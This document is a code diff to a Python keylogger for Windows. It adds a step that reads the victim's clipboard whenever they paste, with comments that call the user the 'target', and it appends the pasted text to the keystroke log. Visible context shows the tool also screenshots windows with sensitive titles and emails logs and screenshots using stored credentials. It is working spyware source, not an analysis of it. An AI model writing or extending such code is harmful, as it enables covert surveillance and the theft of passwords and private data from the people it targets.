@@ -10,6 +10,7 @@ from email.mime.multipart import MIMEMultipart
 from threading import Semaphore, Timer, Event
 from PIL import ImageGrab, Image
 import win32gui
+import win32clipboard
 from config import fromAddr, fromPswd
 
 
@@ -25,8 +26,9 @@ class Keylogger:
         self.interval = interval
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
-        self.log = ""
+        self.log = ''
         self.old_app = ''
+        self.paste_data = ''
         # for blocking after setting the on_release listener
         self.semaphore = Semaphore(0)
         # set the event that will block the screenshotting process while sending e-mail (else oncreasingly longer mail each loop)
@@ -49,11 +51,11 @@ class Keylogger:
         
         sensible_words = []
         
-        if any(ext in new_app for ext in sensible_words): # Screenshot when current window name contains any of the sensible_words (chosse which ones)
+        if any(ext in new_app for ext in sensible_words): # Screenshot when current window name contains any of the sensible_words (choose which ones)
             self.s_screenshot('window')
 
         if new_app != self.old_app and new_app != '' and new_app != 'Task Switching':
-            self.log += f'\n[{date}] ~ {new_app}\n'
+            self.log += f'\n\n[{date}] ~ {new_app}\n'
             self.old_app = new_app
         else:
             pass
@@ -75,8 +77,21 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         
-        if name == 'v' and self.log.endswith('[CTRL]'): # takes a screenshot when target pastes text in an attempt to catch information that isn't typed
-            self.s_screenshot('paste')
+
+        if name == 'v' and self.log.endswith('[CTRL]'): # adds data in the clipboard to self.log when user pastes
+            self.log += name # adds 'v' to end of log 
+            name = '' # sets name back to  '' so 'v' doesn't print after paste data
+            
+            # This gets the content of the clipboard and sets it to self.paste_data
+            win32clipboard.OpenClipboard()
+            self.paste_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            
+            # This adds it to self.log
+            self.log += f'\n\n[PASTE DATA] ~ {self.paste_data}\n'
+            
+            # this sets self.paste_Data back to ''
+            self.paste_data = '' 
 
         # If target presses backspace remove last character in self.log except if its a special key 
         if name == '[BACKSPACE]' and self.log[-1] != ']':
@@ -84,7 +99,6 @@ class Keylogger:
         elif self.log.endswith(name) and name in ['[CTRL]', '[RIGHT_SHIFT]']:
             name = ''
         else:
-            #print(name)
             self.log += name # Add character to self.log
     
 
@@ -103,9 +117,9 @@ class Keylogger:
             filename = os.fsdecode(file)
             if filename.endswith('png'):
                 img_c = Image.open(f'screenshots/{filename}')
-                img_c = img.resize((1920,1080), Image.LANCZOS)
+                img_c = img_c.resize((1920,1080), Image.LANCZOS)
                 img_c.save(f'screenshots/{filename}', optimize=True, quality=85)
-                
+
                 img_data = open(f'screenshots/{filename}', 'rb').read()
                 img = MIMEImage(img_data, name=filename)
                 msg.attach(img)
